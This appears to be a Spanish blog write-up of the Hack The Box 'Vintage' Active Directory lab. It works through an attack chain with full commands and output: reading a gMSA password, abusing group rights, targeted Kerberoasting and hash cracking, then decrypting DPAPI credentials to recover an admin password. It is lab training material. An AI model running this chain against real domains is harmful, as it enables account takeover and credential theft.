---
layout: single
title: Máquina Vintage - Hack The Box 
excerpt: Laboratorio en el que se explota una funcionalidad muy antigua en active directory, permitiendonos realizar movimientos laterales y finalizar con un RBCD attack
classes: wide
header: 
   teaser: ../assets/images/machine-vintage/logo.png
   teaser_home_page: true 
   icon: ../assets/images/hackthebox.webp
categories: 
   - threat intelligence
   - sherlock
tags: 
   - mittre att&ck
   - virus total 
--- 


# **Hack The Box - Vintage** 

Una màquina de Active Directory, se nos proporcionan credenciales para simular un entorno real de pentesting **`P.Rosa / Rosaisbest123`**, pasamos rápidamente a la máquina. 

## **Reconocimiento** 

```bash 
┌──(kali㉿kali)-[~]
└─$ ping -c 1 10.10.11.45
PING 10.10.11.45 (10.10.11.45) 56(84) bytes of data.
64 bytes from 10.10.11.45: icmp_seq=1 ttl=127 time=119 ms

--- 10.10.11.45 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 118.554/118.554/118.554/0.000 ms
```

Máquina con `ttl` igual a 127, una máquina windows. Pasemos al escaneo con Nmap:

```bash 
┌──(kali㉿kali)-[~]
└─$ ports=$(nmap -p- --open -sS -T5 -n -Pn 10.10.11.45 | awk '/^[0-9]+\/tcp/ {split($1,a,"/"); print a[1]}' | paste -sd,)
```

Lanzamos el escaneo con nmap: 

```bash 
┌──(kali㉿kali)-[~/labs-hack]
└─$ nmap -p$ports 10.10.11.45 -sCV -oN vintage_scan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-02 00:13 EDT
Nmap scan report for 10.10.11.45
Host is up (0.16s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-02 04:13:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         Microsoft Windows RPC
50046/tcp open  msrpc         Microsoft Windows RPC
50124/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-02T04:14:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.14 seconds
```

Agregamos el nombre del dominio al `/etc/hosts`

```bash 
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ echo "10.10.11.45 vintage.htb dc01 dc01.vintage.htb" | sudo tee -a /etc/hosts
10.10.11.45 vintage.htb dc01 dc01.vintage.htb
```

---
## **Acceso inicial**

Bien, ahora ya empezamos a ver como podemos lograr acceder al sistema, intentamos autenticarnos con `smb` 

```bash 
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ netexec smb dc01.vintage.htb -u p.rosa -p Rosaisbest123  
SMB         10.10.11.45     445    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False)
SMB         10.10.11.45     445    10.10.11.45      [-] 10.10.11.45\p.rosa:Rosaisbest123 STATUS_NOT_SUPPORTED 
``` 

Nos da error, intentamos con kerberos: 

```bash 
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ netexec smb dc01.vintage.htb -k -u p.rosa -p Rosaisbest123    
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\p.rosa:Rosaisbest123 
```

Por defecto `netexec` usa `NTLM` como protocolo de autenticación, con la flag `-k` le indicamos que tiene que usar un ticket `TGT` vàlido. Si falla la autenticación con NTLM es probable que use este tipo de autenticacion, este TGT válido se puede generar con `kinit`, que es una herramiena de linea de comando usada para obtener TGT's de kerberos, acontinuación un ejemplo:

```bash 
kinit rosa@VINTAGE.HTB
```

Para listar los TGT's: 
```bash 
klist
```

Para borrarlos: 
```bash 
kdestroy
```

En un entorno real primero hay que generar el TGT y después usar la flag -k, pues netexec no genera la solicitud para un TGT valido, para efectos prácticos no se hace asi, pero si fuera el caso, usaríamos el siguinte comando para autenticarnos después de generar el TGT: 

```bash 
netexec smb dc01.vintage.htb -k -u p.rosa
```

Ya no necesitaríamos proporcionar la contraseña, con el TGT basta. 

**Ahora empezamos la recolección con bloodhound**: 

```bash 
python3 -m venv blood  

source blood/bin/activate 

pip install bloodhound
```

Lanzamos contra el dominio. 

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage]
└─$ bloodhound-python -c all -d vintage.htb -u p.rosa -p Rosaisbest123 -ns 10.10.11.45
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: vintage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The DNS query name does not exist: FS01.vintage.htb.
INFO: Done in 00M 23S
```

Iniciamos bloodhoun y neo4j: 

```bash 

sudo neo4j console

bloodhound
``` 

Siempre se busca tener algo en `Outbound Object Control`, en este caso no lo tenemos, exploramos las opciones de `shortest path to here`. 

Una cosa interesante para ver es lo siguiente: 

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage]
└─$ cat 20250502015616_users.json| jq '.data[].Properties | select(.samaccountname) | "\(.pwdlastset):\(.samaccountname)"' -r | sort -n  
1717583255:krbtgt
1717594268:G.Viola
1717594268:L.Bianchi
1717594268:M.Rossi
1717594268:R.Verdi
1717621693:C.Neri
1717681527:svc_ark
1717681527:svc_ldap
1717757654:C.Neri_adm
1717846494:Administrator
1730896036:P.Rosa
1731507413:Guest
1732621230:L.Bianchi_adm
1746111016:gMSA01$
1746165124:svc_sql
```

Los usuarios con el mismo valor puede que tengan la misma contraseña, puede que al momento de crearlos en el dominio el script que automatizó esto creo usuarios con la misma conraseña al mismo tiempo. 

> EL campo `samaccountname` es el nombre con el que el usuario inicia sesión en su sistema 


Bien, una vez que bloodhound.py ha obtenido la infomación, la ponemos dentro de bloodhound y explorando los datos observamos lo siguiente: 


El grupo `PRE-WINDOWS 2000 COMPATIBLE ACCESS`, y del cual el usuario `FS01` es miembro.

![](../assets/images/machine-vintage/imagen1.png)

---

---

Explorando aún más el bloodhound, vemos lo siguiente: 

![](../assets/images/machine-vintage/imagen2.png)

Por lo que podemos recuperar la contraseña del **`gMSA`**, que esta cuenta tiene un uso previsto para permitir que uno o varios equipos autorizados (por ejemplo, miembros del grupo DOMAIN COMPUTERS u otros grupos definidos) obtengan la contraseña actual del gMSA y la usen para ejecutar servicios locales (IIS, SQL Server, Windows Service, etc.) sin necesidad de gestionar manualmente la rotación de contraseñas.

Sabiendo todo esto, ya podemos intentar acceder de esta forma: 

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage]
└─$ netexec smb dc01.vintage.htb -k -u 'fs01$'  -p fs01
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\fs01$:fs01
``` 

El usuario es válido, ahora intentamos obtener el hash NTLM del usuario `gMSA`

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage]
└─$ bloodyAD -d vintage.htb -u 'fs01$' -p 'fs01' --host dc01.vintage.htb -k get object 'gmsa01$' --attr msDS-ManagedPassword 

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:0ae29a5cdfa7d5b72464dc92ffeaa8d1
msDS-ManagedPassword.B64ENCODED: ty0aA5C/XrOL6Y9WX9oh9HVPkZt0LuzCev+iAuZfmr2JuYWvtLnlU9DWeV94D7cL0TYP/7z4JKNNKwZaW3nzVkh6dWEDQpArgRPAzakAo798b146sR2FxiX7tzwvWFwiua8wv4fN34853UAKyGrcXR9OxUMOpwhXeRAX4oUz/ggCcZ6VxCpcsXXMPx/cQ/KSW3gPgpUrD3F0S91dm5qBD2a2pUmoPtFr16G1G/XF1jFPIDZp+QTe4HoSgg7+LtjD8aYIBVatzn6WLLwrHkxP5ZJ2RvHb8YH1jAR9lZDx5eCouGfkq8/4kelNN//JaPh5EwTMrWQrVEY6xk/yJDVXmg==
```
Cada vez que recuperamos el atributo `msDS-ManagedPassword` de un gMSA, el controlador de dominio genera **una nueva contraseña aleatoria** para ese gMSA y la cifra de nuevo en el blob que tú consultas. Por eso:

1. El primer bloque (`aad3b435b51404eeaad3b435b51404ee`) es siempre el **hash LM “vacío”** (un placeholder que Windows usa cuando no hay LM hash).
2. El segundo bloque (después de los dos puntos) es el **hash NT** de la contraseña **actual** del gMSA.


* **Rotación “on‐demand”**: A diferencia de una cuenta de usuario normal, un gMSA **no tiene una contraseña estática**. Cuando tú pides `msDS-ManagedPassword`, el DC calcula:

  1. Una contraseña aleatoria nueva (dentro del intervalo definido en `msDS-ManagedPasswordInterval`).
  2. La cifra y la almacena en el atributo.
  3. Te la devuelve en el blob.

* **Resultado**: Con cada llamada activa ese proceso  vemos **un hash NT distinto** porque la contraseña subyacente ha cambiado.



* El hash NTLM de una **cuenta de usuario tradicional** permanece igual hasta que alguien cambie la contraseña.
* El hash NTLM de un **gMSA** cambia **cada vez** que lo consultas (o al menos cada vez que expira su intervalo), porque el DC genera una contraseña nueva automáticamente.




Explorando más en bloodhount, vemos lo siguiente para este usaurio: 

![](../assets/images/machine-vintage/imagen3.png)

![](../assets/images/machine-vintage/imagen4.png)

Basicamente, desde `gMSA` podemos llegar a servicios como el de `SQL`, pues tenemos permisos de `genericAll`, podemos hacer lo que queramos con estos servicios. 

También vimos que los otros dos servicios tienen el mismo tiempo en el que se les generó la contraseña: 

```bash 
1717681527:svc_ark
1717681527:svc_ldap
```

SQL tiene uno diferente, tal vez le cambiaron la contraseña cuando accederion al servicio porque de los 3 es el más "util". 

**Primero nos agregamos al grupo ServiceManagers, del cual ya vimos que tenemos la configuracion seteada como `AddSelf`** 

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage]
└─$ bloodyAD -d vintage.htb -u 'gmsa01$' -p '0ae29a5cdfa7d5b72464dc92ffeaa8d1' -f rc4 --host dc01.vintage.htb -k add groupMember ServiceManagers 'gmsa01$' 
[+] gmsa01$ added to ServiceManagers
```

  para esto nos descargamos la herramienta [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast). 


Primero nos generamos un TGT con `getTGT.py`, que ya sabemos que se necesita para realizar un `kerberoasting attack`: 

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage/kerberoast]
└─$ getTGT.py 'vintage.htb/gmsa01$' -dc-ip 10.10.11.45 -hashes :0ae29a5cdfa7d5b72464dc92ffeaa8d1                            
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in gmsa01$.ccache
```

Y lanzamos el ataque: 

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage/kerberoast]
└─$ KRB5CCNAME=gmsa01$.ccache python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb                                         
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (svc_ldap)
$krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb/svc_ldap*$602b60fffd8a39cdc5ce8ae67ad165d1$db8cea7ffd2fbb69a6b7348513570f4a60424418589a4ffab1894356031039dc0dab3025942ce37bea512bcdacb07237ff23f15c17eb4db61898597385137d7f27a3922c27b5ea52b1e72f22d9a801fb5fcc251e0e56e187451bb08e50b96d710f8d86775f072cb7c6e11d4a351ce2e7e4fd5df9811479e3313bb2d0a4a9af9499d5b1bc797339bd5d0668ecc80aa5495b87387964ebfb8bfb7faf9c8fa007f4e2d6a39df798f2bc467aa1088d7d263ea2344a1e66744a36343a93987b4b07da03f93563ff5df084d4a1741cd9bd8ab28881bb3e196f840449173a175de2dbd5d48fb98003edf93062de5fafbb31f2d2aa477913339c3829134dcb77a4085784042fbc29e1c5c3536596fda234600732d18de78b83d81f1a341dfa55b8f518df69d0f8afc2641283464fad5f870ab1099651b74fac6bbca495b39c74440c31e821e42a09c5c2536fa3542f6611e79eca27fdbca7f4402b8c189902d2300a008752ce38e586bf1ca796516063c43f5dc0afbeb746fa2d93f6999fcd1d0df367e4e801888b86344be0dd1d8e21221c78551f7323555b4867cdc9fb231b0730a342170abcb10039141e450dcf70b1e6fe6fd7e759300deea8a5bd2f0f73294a372acca758a11e84a1326ec4471fe33abe429c5f1ebf31049080180d55e13eb5fb9f762d1ce8dda9ea3acce74de145e5696c260d6f0dc0cec148285699c26c8c0cdf2e785b66007c76364f8d9f47af9b74ff4d2c2eaa42f45d904186ce565242a5d67ca69d69744616aba72248eca5aba9d1948f224f026a7a727c44236b5d997cf7b44e6aef26a6a28a371db5adb724ee70fa1d2cbce8acd9f183dddad9360e8dae37a5d00f898485b9c35173ad3d14683ebc4e1a242b6a0ddb8afb7d7e1e9e7e8bfdd0f846a669ca50213ea9ccc3f822b53785cbade5753833dfe6aea0fb984b740d897e6a73d21326c960ce11412ae948330f9ee0bbc458c2e8dfa4e89c0c1051f4ba44aea2187e626dba1215e4c026538568b965cea56b6912e112b16363edabc496afe6ada7a75268e2fe75c168b42b397791e63bb1b719f831ff28e152e3dbf5703a3c4b5083edf1d6fff39924f1cc80bec18a089909ddc2e678f3d6e61616c9523b383c4c966b29de962f1f23f4cb35685744e2a5dbf92298ede1a79eb2f58f906c3975a8b2dfab8abe4fff8a3a07ceee8a2cc7097239bcdf3b571bda8122b900fc17d198c62e48e8fad68be44595fe09a3067c6e4dfadb3757a2628b55236e187ec68556aad273630d0a0b963ee8fe4d6f2cca84e8721756f411cfd0f6364eea093369be1cdc1de333b92638167fc4b620486f84d01b73eca4963af145105600849b2663d12e82578ce94d3507c8ecfc6ac23c88812c621f9bd0c08079119bfaf4722813275c821940c73da387f4485bffe92aef3802d123f3fb2a5332607891ed
[+] Printing hash for (svc_ark)
$krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb/svc_ark*$98b8ad8e690ede410ef2d5fb9aec6db9$92a41ca1a3d2a536ad58206b4bf6735ffe690f8efd9ea1836cd0584a7b0dd35229e7a5d995fd65d0ab28a8ed22bb64bdb23eb959b4fc96d5302ba311fbf7f192198ce07b15789acababff236c06c49026f7a83d35b0b28f2d8ed689a99e48b01dbe669b506cc67c7d63e46c2fd8c38a81847601233628e5872436df27f50340553127fdb798e96f405b5a67fcde9ead68f3d40468a1fcea85f9da7a07f1ff9612a3db8a12baadd0207cf64ff78d195e2d262b5591c8fb9a0fc10b5dccadda7c05d23a73c0753807263197b915b42396ddf0b4f1e97ae7267adf60f3c670f68d2d6ea376752304e8180356b48393c83e9a6625dd92b8b15b917fcb873ff5057b537e8967e7cb023bb3cad2a664194bb916e7800ddeae02b2a3001e43a4e9fd02182e51c7b1bd419e9ace8a6a08d031ba4bb8e6192373e1f247fca568863fec312ec80c7cc0ef32cc2fb2cc9881e903ce59dc38668a54ce7a2ae1f96940494b628017dd598a9da89fc9cd69ecebc16302efe39e41916904c991ab9548332a98dd389fae24022aec4b9d25c49ded29cc2359c1c3dfa548e48a1e88b9b83f6344025fa84f60709d531ef39c6528db63b167bc479161c844f595c6016f51f39440c152b50da6574ee3adfa4c09ef68b75d876eabab73a33f763734294d74ba6fe27d90697c5b90aa4127cdaf5491f4ea24feaed896d54f3a369f742f24c11a5e5b9c563cfc8f69eadf3b898f42368343549f01864f0ebb881ee3f5d261f5dfd3dd8e32190265b0c7d38e39691fb4dd0e822a5aa548cdda0b8d8670c5fd6fe5a69220b5e4f40bb558b0bb03f17b119ae1eed679586dbff06c5a55eb7c7d73fdcce777576916aa239e50e6c392b4d69fa2910809cb95d70a3175eb6f9e90f23a826f02d2f6d516f49419bd3833ba8319b25df4bfd2c3beb9915e04d5beb2d448601d891f0699079361d7166abb81706ed76cc7d63b2f462038d96486a9e33365a43451c2d14616340392cdd17c17410fb4cb71859243769e12f72a644e95593a463b75ac60f1c4f3bb7b25664227a844bc6f2a109cdcaf22f9466ef8db24d9092927d7f10458490e5778d00bd1cf3f755825b960e5f8f08a88cd4c2272ecc891dc8c170f86ae15c4a153c12d74fd85a881bab3b9b2c63d2e1fca7a4825b7643e2b7f8842ac4db23ff5dcc5c61a56b5b842ba0d48cbb43e10a21456c897bd56102ae24a8d6af48bc45029ebfc7b4f3339880520e56768540e42732fd6d8762eb4c9de812fc26523acd88a42f28a8e240b563d23240d2cec6b60c8465c1761551e39a329965d8866cd395671ba1b23bc9ed299c34b69a8484f817ccd8a8f00057fcc22765d224e4ce4de60b3873e392322fa8e434e1a3be34fe8c30420bf82a10bdd778e2c4c1f50b39d0ae0db3e1dd76801c93cc66eb36ab7cf00ffa365352155d33ef95a8be3a
```

> puede que haya un script que nos elimine del grupo, volvemos a ejecutar `bloodyAD -d vintage.htb -u 'gmsa01$' -p '0ae29a5cdfa7d5b72464dc92ffeaa8d1' -f rc4 --host dc01.vintage.htb -k add groupMember ServiceManagers 'gmsa01$'`


Habilitamos el servicio `svc_sql`: 

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage/kerberoast]
└─$ bloodyAD -d vintage.htb -u 'gmsa01$' -p '0ae29a5cdfa7d5b72464dc92ffeaa8d1' -f rc4 --host dc01.vintage.htb -k remove uac svc_sql -f ACCOUNTDISABLE         
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
```

y volvemos a obtener los hashes: 

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage/kerberoast]
└─$ KRB5CCNAME=gmsa01$.ccache python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb | grep krb5tgs > hashes
```

Y crackeamos con john: 

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage/kerberoast]
└─$ john -w:/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Zer0the0ne       (?)     
1g 0:00:00:03 7.84% (ETA: 07:09:31) 0.3134g/s 398204p/s 1122Kc/s 1122KC/s solerti..sogor
1g 0:00:00:38 DONE (2025-05-02 07:09) 0.02582g/s 370448p/s 767712c/s 767712C/s  0841079575..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Tenemos una contraseña, lo primero que podemos probrar es `password spraying`: 


Obtenemos las contraseñas:

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage]
└─$ cat 20250502015616_users.json| jq '.data[].Properties | .samaccountname ' -r | sort -n > users.txt
```



Nos creamos un TGT para poder acceder con ese usuario: 

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage]
└─$ getTGT.py 'vintage.htb/c.neri' -dc-ip 10.10.11.45                                           
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in c.neri.ccache
``` 
Creamos el fichero `vintage.krb5` para poder acceder al dominio, le ponemos lo siguiente: 
```bash 
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VINTAGE.HTB

[realms]
    VINTAGE.HTB = { 
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
        default_domain = vintage.htb
    }   

[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB
```

Lo copiamos a la configuración de kerberos: 

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage]
└─$ sudo cp vintage.krb5 /etc/krb5.conf 
```

Y nos metemos con evil-winrm

![](../assets/images/sherlock-vintage/imagen5.png)

Ya podemos acceder a la primer flag en `C:\Users\C.neri\Desktop\user.txt`


El comando gci -force en PowerShell (y por tanto en Evil-WinRM) es un alias para Get-ChildItem -Force, que se usa para listar archivos y directorios, incluyendo aquellos que están:
- Ocultos (Hidden)
- Del sistema (System)

Esto es útil en tareas de post-explotación, porque permite ver archivos y carpetas que normalmente estarían ocultos para un usuario estándar, como AppData, NTUSER.DAT, ntuser.ini, y varios enlaces simbólicos del sistema como Start Menu, SendTo, etc.

Ahora podemos movernos al directorio `AppData\Roaming\Microsoft\Credentials`?

Que es un directorio usado por Windows para almacenar secretos cifrados, y forma parte de la infraestructura del Windows Credential Manager. Específicamente, el archivo que ves (como C4BB96844A5C9DD45D5B6A9859252BA6) contiene credenciales protegidas (DPAPI), como:

- Contraseñas guardadas por el usuario.
- Credenciales de red o recursos compartidos.
- Tokens de acceso a servicios.

Estos archivos están cifrados con DPAPI (Data Protection API) usando claves ligadas al perfil del usuario.

**Ahora obtenemos la masterkey del usuario**:

```bash 
*Evil-WinRM* PS C:\Users\C.Neri\appdata\roaming\microsoft\credentials> cd ..
*Evil-WinRM* PS C:\Users\C.Neri\appdata\roaming\microsoft> cd protect
*Evil-WinRM* PS C:\Users\C.Neri\appdata\roaming\microsoft\protect> dir


    Directory: C:\Users\C.Neri\appdata\roaming\microsoft\protect


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-          6/7/2024   1:17 PM                S-1-5-21-4024337825-2033394866-2055507597-1115


*Evil-WinRM* PS C:\Users\C.Neri\appdata\roaming\microsoft\protect> cd S-1-5-21-4024337825-2033394866-2055507597-1115
*Evil-WinRM* PS C:\Users\C.Neri\appdata\roaming\microsoft\protect\S-1-5-21-4024337825-2033394866-2055507597-1115> gci -force


    Directory: C:\Users\C.Neri\appdata\roaming\microsoft\protect\S-1-5-21-4024337825-2033394866-2055507597-1115


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred
```

Las convertimos a base 64 y guardamos en un fichero 

![](../assets/images/machine-vintage/imagen6.png)

```bash 
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ cat credentialblob.b64| base64 -d                                                                 
�Ќ����z�O��AϙR��L�׬���3� :Enterprise Credential Data
f��l�nfp3\\���
              ��+��L^�����D����hɥ%���'T�nG���U�<�m�:ֈ�-
d��4�*�(ɥ�e�����y���xѤ���▒ӯ�V�gcI@t��d��[���]Kӛ�+�[�n���\�yr���r�����▒�c��.�,��gB�P���%jʭ��'p9�aќa�f�
                                                                                                     ��\|=���i�b}���k�F/�
                                                                                                                         ����+aJ�g�G;{��@��>�
                                                                                                                                            �
                                                                                                                                             ���
*�<�3                                                                                                                                           5]▒�{b���$�K�j)�'���E+���R���(��
     (d                                                                                                                                                                                            
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ cat credentialblob.b64| base64 -d > credentialblob
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ cat dpapiblob1.b64| base64 -d > dpapiblob1        
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ cat dpapiblob2.b64| base64 -d > dpapiblob2
```

Después hacemos:

```bash 
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ pypykatz dpapi prekey password 'S-1-5-21-4024337825-2033394866-2055507597-1115' 'Zer0the0ne' | tee pkf
17c1ad77aadc85e9323cb5388e844c457006a851
6dc07689c6d69ec2b52e9ee0c57974c642785394
883b7bcf6205c256899ded746012a7d16fbdc894
0bcfc20f2634bb31590dad98c69c83453c6e5154
``` 


**DPAPI** (Data Protection API) es una funcionalidad de Windows que permite a aplicaciones y servicios **cifrar y descifrar datos sensibles** usando claves gestionadas por el sistema operativo. Se usa para proteger:

* Contraseñas (como las del Credential Manager).
* Cookies del navegador.
* Certificados privados.
* Tokens de acceso y más.

La protección depende del **usuario**, es decir, los datos cifrados por DPAPI **solo pueden ser descifrados si tienes acceso al perfil del usuario** (o sus secretos).


Este comando genera las **pre-claves maestras (MasterKey prekeys)** que DPAPI usa para descifrar blobs, **a partir de la contraseña del usuario**.

```bash
pypykatz dpapi prekey password 'SID_DEL_USUARIO' 'CONTRASEÑA'
```

Esto hace  lo siguiente:

1. Calcula derivaciones criptográficas usando:

   * El **SID del usuario**.
   * La **contraseña en texto plano**.
2. Genera los **valores posibles de pre-claves DPAPI**.
3. Entrega un conjunto de hashe que son necesarios para descifrar archivos como:

   * Credenciales (`\Credentials\`).
   * Cookies.
   * Archivos cifrados con DPAPI.


```bash 
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ pypykatz dpapi masterkey dpapiblob1 pkf -o mkf1                                                       
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ pypykatz dpapi masterkey dpapiblob2 pkf -o mkf2
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ cat mkf1
{
    "backupkeys": {},
    "masterkeys": {
        "4dbf04d8-529b-4b4c-b4ae-8e875e4fe847": "55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f"
    }
}                                                                                                                                                                                            
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ cat mkf2
{
    "backupkeys": {},
    "masterkeys": {
        "99cf41a3-a552-4cf7-a8d7-aca2d6f7339b": "f8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a"
    }
} 
```


Copiamo la masterkey de mkf2 dentrode mkf, para tenerlas juntitas a ambas: 
```bash                                                                                                                                                                                           
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ cp mkf1 mkf 
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ vi mkf
```

**Finalmente, desencriptamos**: 

```bash 
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ pypykatz dpapi credential mkf credentialblob
type : GENERIC (1)
last_written : 133622465035169458
target : LegacyGeneric:target=admin_acc
username : vintage\c.neri_adm
unknown4 : b'U\x00n\x00c\x00r\x004\x00c\x00k\x004\x00b\x00l\x003\x00P\x004\x00s\x00s\x00W\x000\x00r\x00d\x000\x003\x001\x002\x00'
```

**Resumen general después de tanto lío**

## 1. Capturar el blob cifrado (el “sobre” sellado)

* **Archivo**: `C4BB…BA6` en `Credentials`
* **Comando**:

  ```powershell
  [Convert]::ToBase64String([IO.File]::ReadAllBytes(...))
  ```
* **Qué hace**: Lee el fichero binario y lo convierte a Base64.
* **Por qué**: Facilita pasarlo a herramientas en Kali sin corromper bytes.

## 2. Obtener las masterkeys (las “llaves maestras”)

* En `AppData\Roaming\Microsoft\Protect\<SID>\` tienes uno o varios archivos GUID (por ejemplo `4dbf04d8-529b…e847`) que contienen las **claves maestras** cifradas.
* Para descifrarlas necesitamos la contraseña del usuario (o su hash) y su SID.
* Con `pypykatz dpapi prekey password <SID> <pass>` obtuvimos los posibles “pre-keys” derivadas de esa contraseña.

## 3. Extraer realmente las masterkeys

* Los blobs que descargaste (digamos `dpapiblob1`, `dpapiblob2`) contienen las claves maestras cifradas.
* Con:

  ```bash
  pypykatz dpapi masterkey dpapiblob1 pkf -o mkf1
  pypykatz dpapi masterkey dpapiblob2 pkf -o mkf2
  ```

  estamos **descifrando** cada uno de esos blobs usando las pre-keys. El resultado (`mkf1`, `mkf2`) es un pequeño JSON con:

  ```json
  {
    "masterkeys": {
      "<GUID>": "<clave_maestra_en_hex>"
    }
  }
  ```
* **Analogía**: Cada blob era una caja fuerte con dentro una llave. Derivamos la combinación (pre-keys) y abrimos la caja, sacando la llave (masterkey).

## 4. Unir todas las masterkeys en un solo fichero

* Copiamos `mkf1` y `mkf2` en un único `mkf` para tener **todas** las claves maestras a mano.
* Así, cuando lleguemos al siguiente paso de desencriptar el blob de credenciales, la herramienta sabe dónde encontrar todas las llaves.

## 5. (El próximo paso) Desencriptar el blob de credenciales

